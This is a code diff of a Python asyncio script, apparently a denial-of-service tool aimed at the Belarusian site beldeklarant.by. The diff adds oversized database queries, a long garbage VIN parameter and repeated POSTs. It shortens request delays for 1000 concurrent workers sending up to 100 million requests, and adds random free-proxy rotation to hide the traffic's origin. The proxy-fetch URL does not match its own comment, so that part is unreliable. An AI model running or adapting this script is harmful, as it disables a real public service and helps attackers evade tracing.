@@ -1,17 +1,20 @@
+import os
 import asyncio
 import json
 import random
-import secrets
 import socket
 import ssl
-import string
 import sys
 import time
 import urllib.parse
+import urllib.request
 import uuid
+
 from datetime import datetime, timezone
 
 import aiohttp
+
+from aiohttp_socks import ProxyConnector
 
 try:
     import h2.connection as h2_connection  # type: ignore[import-not-found]
@@ -22,56 +25,20 @@ except ImportError:  # pragma: no cover - environment guard
     h2_config = None
     ErrorCodes = None
 
-PROXY_SERVER = os.getenv("PROXY_URL") #ща докину остальную часть поддержки прокси
-
 # Список проверок: эндпоинты из примера скрипта
 CHECKS = [
     [
-        {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True, "kind": "vehicles_vin1"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=Z94C251BBJR012546", "method": "GET", "ssl": True, "kind": "Z94C251BBJR012546"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JMZKFGWMA00315072", "method": "GET", "ssl": True, "kind": "JMZKFGWMA00315072"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=NMTK33BX10R240096", "method": "GET", "ssl": True, "kind": "NMTK33BX10R240096"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=WVGZZZ5NZKM171297", "method": "GET", "ssl": True, "kind": "WVGZZZ5NZKM171297"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JHMRW2860KX212574", "method": "GET", "ssl": True, "kind": "JHMRW2860KX212574"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JTMW43FV90D082547", "method": "GET", "ssl": True, "kind": "JTMW43FV90D082547"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JMZKE5W7AP0452546", "method": "GET", "ssl": True, "kind": "JMZKE5W7AP0452546"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=VF1JL000X64372147", "method": "GET", "ssl": True, "kind": "VF1JL000X64372147"},
+        {"url": "http://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles"},
+        {"url": "http://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles1"},
     ],[
-        {"url": "https://beldeklarant.by/container.svg", "method": "GET", "ssl": True, "kind": "container"},
-        {"url": "https://beldeklarant.by/bptp.svg", "method": "GET", "ssl": True, "kind": "bptp"},
-        {"url": "https://beldeklarant.by/bts.jpg", "method": "GET", "ssl": True, "kind": "bts"},
-        {"url": "https://beldeklarant.by/arrow.webp", "method": "GET", "ssl": True, "kind": "arrow"},
-        {"url": "https://beldeklarant.by/styles.css", "method": "GET", "ssl": True, "kind": "styles"},
-        {"url": "https://beldeklarant.by/script.js", "method": "GET", "ssl": True, "kind": "script"},
-        {"url": "https://beldeklarant.by/error.jpg", "method": "GET", "ssl": True, "kind": "errorjpg"},
-        {"url": "https://beldeklarant.by/ztk.svg", "method": "GET", "ssl": True, "kind": "ztk"},
-        {"url": "https://beldeklarant.by/rptto.svg", "method": "GET", "ssl": True, "kind": "rptto"},
+        {"url": "http://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch"},
+        {"url": "http://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch1"},
     ],[
-        {"url": "https://beldeklarant.by/api/vehicles?vin=WMW41BR0303P12046", "method": "GET", "ssl": False, "kind": "WMW41BR0303P12046"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=WBAWZ510600M36817", "method": "GET", "ssl": False, "kind": "WBAWZ510600M36817"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JTME6RFV5RJ895216", "method": "GET", "ssl": False, "kind": "JTME6RFV5RJ895216"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=TMAJ3812GJJ436125", "method": "GET", "ssl": False, "kind": "TMAJ3812GJJ436125"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=KNARH81GDM5010456", "method": "GET", "ssl": False, "kind": "KNARH81GDM5010456"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JM3KFBDM3P0201488", "method": "GET", "ssl": False, "kind": "JM3KFBDM3P0201488"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=WDC1660241A561488", "method": "GET", "ssl": False, "kind": "WDC1660241A561488"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=JMBXTGK1WJZ028426", "method": "GET", "ssl": False, "kind": "JMBXTGK1WJZ028426"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=TMBJJ7NS2P8595463", "method": "GET", "ssl": False, "kind": "TMBJJ7NS2P8595463"},
-        {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": False, "kind": "W1K2060431R001488"},
-    ],[
-        {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": False, "kind": "log_visit1"},
-    ],[
-        {"url": "https://beldeklarant.by/container.svg", "method": "GET", "ssl": False, "kind": "container"},
-        {"url": "https://beldeklarant.by/bptp.svg", "method": "GET", "ssl": False, "kind": "bptp"},
-        {"url": "https://beldeklarant.by/bts.jpg", "method": "GET", "ssl": False, "kind": "bts"},
-        {"url": "https://beldeklarant.by/arrow.webp", "method": "GET", "ssl": False, "kind": "arrow"},
-        {"url": "https://beldeklarant.by/styles.css", "method": "GET", "ssl": False, "kind": "styles"},
-        {"url": "https://beldeklarant.by/script.js", "method": "GET", "ssl": False, "kind": "script"},
-        {"url": "https://beldeklarant.by/error.jpg", "method": "GET", "ssl": False, "kind": "errorjpg"},
-        {"url": "https://beldeklarant.by/ztk.svg", "method": "GET", "ssl": False, "kind": "ztk"},
-        {"url": "https://beldeklarant.by/rptto.svg", "method": "GET", "ssl": False, "kind": "rptto"},
+        {"url": "https://beldeklarant.by/log-visit", "method": "POST", "ssl": False, "kind": "log_visit1"},
+        {"url": "https://beldeklarant.by/log-visit", "method": "POST", "ssl": False, "kind": "log_visit2"},
     ],[
         {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": False, "kind": "vehicles_list"},
+        {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": False, "kind": "vehicles_list1"},
     ]
 ]
 
@@ -98,9 +65,9 @@ elif MODE == "rapid":
     BYTE_RATE_PER_SECOND = None
 else:
     TOTAL_REQUESTS = 100000000
-    DELAY_BETWEEN_REQ = 0.5
+    DELAY_BETWEEN_REQ = 0.05
     MAX_CONCURRENT = 1000
-    JITTER = 10.0
+    JITTER = 1.0
     BYTE_RATE_PER_SECOND = None
 
 USER_AGENTS = [
@@ -416,15 +383,65 @@ async def worker(session, worker_id):
         sleep_for = DELAY_BETWEEN_REQ + random.uniform(0, JITTER)
         await asyncio.sleep(sleep_for)
 
+def get_random_free_proxy():
+    """Скачивает свежий список прокси из ProxyScrape и возвращает один случайный IP:PORT"""
+    url = "https://jsdelivr.net"
+    try:
+        print("[*] Запрашиваем свежий пул бесплатных прокси из ProxyScrape...")
+        # Скачиваем текстовый файл напрямую через urllib (чтобы не плодить асинхронные сессии раньше времени)
+        with urllib.request.urlopen(url, timeout=10) as response:
+            content = response.read().decode('utf-8')
+            
+        # Разбиваем текст на строки и убираем пустые
+        proxies = [line.strip() for line in content.splitlines() if line.strip()]
+        
+        if proxies:
+            selected = random.choice(proxies)
+            print(f"[+] Успешно получен случайный прокси из пула ({len(proxies)} шт.): {selected}")
+            return selected
+        else:
+            print("[!] Список прокси оказался пустым!")
+            return None
+    except Exception as e:
+        print(f"[!] Не удалось автоматически загрузить прокси: {e}")
+        return None
 
 async def main():
     print("[*] Запуск асинхронного теста")
     print(f"[*] Режим: {MODE}")
     print(f"[*] Целей для проверки: {len(CHECKS)}")
     print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")
+    
+    proxy_raw = None
+    proxy_source = ""
 
-    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)
+    # 1. Приоритет 1: Ищем готовый адрес в переменных окружения Docker
+    if os.getenv("PROXY_URL"):
+        proxy_raw = os.getenv("PROXY_URL")
+        proxy_source = "Окружение (Docker)"
 
+    # 2. Приоритет 2: Если в ENV пусто, но в аргументах передано именно слово "proxy"
+    elif len(sys.argv) >= 3 and sys.argv[2].lower() == "proxy":
+        proxy_source = "Авто-подгрузка (маркер 'proxy')"
+        proxy_raw = get_random_free_proxy()
+
+    # 3. Инициализируем коннектор
+    if not proxy_raw:
+        print("[*] Работаем НАПРЯМУЮ без прокси.")
+        connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)
+    else:
+        # Форматируем строку (добавляем http:// для чистых IP:PORT)
+        proxy_url = proxy_raw if "://" in proxy_raw else f"http://{proxy_raw}"
+        print(f"[*] Источник: {proxy_source}")
+        print(f"[*] Все воркеры используют адрес: {proxy_url}")
+        
+        connector = ProxyConnector.from_url(
+            proxy_url,
+            use_dns_cache=True,
+            ttl_dns_cache=3
+        )
+
+    # 4. Запуск сессии и воркеров (без изменений)
     async with aiohttp.ClientSession(connector=connector) as session:
         workers = [
             asyncio.create_task(worker(session, worker_id))
@@ -435,7 +452,6 @@ async def main():
     print("\n--- Итоги тестирования ---")
     print(f"Успешных запросов: {success_count}")
     print(f"Ошибок/сбоев: {fail_count}")
-
 
 if __name__ == "__main__":
     import sys
